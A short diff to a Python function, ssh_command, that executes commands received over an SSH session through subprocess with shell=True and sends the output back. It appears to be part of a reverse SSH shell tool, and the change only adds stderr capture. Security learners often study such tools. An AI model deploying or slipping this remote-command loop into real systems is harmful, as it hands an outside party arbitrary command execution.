@@ -18,7 +18,7 @@ def ssh_command(ip, port, user, password):
                 if cmd == 'exit':
                     client.close()
                     break
-                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
+                cmd_output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT, shell=True)
                 ssh_session.send(cmd_output or 'ok')
             except Exception as e:
                 ssh_session.send(str(e))
